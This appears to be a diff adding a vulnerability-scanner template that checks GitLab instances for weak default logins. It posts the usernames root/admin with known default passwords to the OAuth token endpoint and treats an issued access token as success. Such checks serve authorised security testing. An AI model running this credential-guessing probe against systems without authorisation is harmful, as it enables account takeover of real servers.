@@ -1,0 +1,23 @@
+name: gitlab-weak-login
+sets:
+  username:
+    - "root"
+    - "admin"
+    - "admin@local.host"
+  password:
+    - "5iveL!fe"
+    - "123456789"
+rules:
+  - method: POST
+    path: "/oauth/token"
+    headers:
+      Accept: application/json, text/plain, */*
+      Content-Type: application/json
+    body: |
+      {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
+    expression: |
+      response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"access_token\":") && response.body.bcontains(b"\"token_type\":") && response.body.bcontains(b"\"refresh_token\":")
+detail:
+  author: Suman_Kar,dwisiswant0
+  links:
+    - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
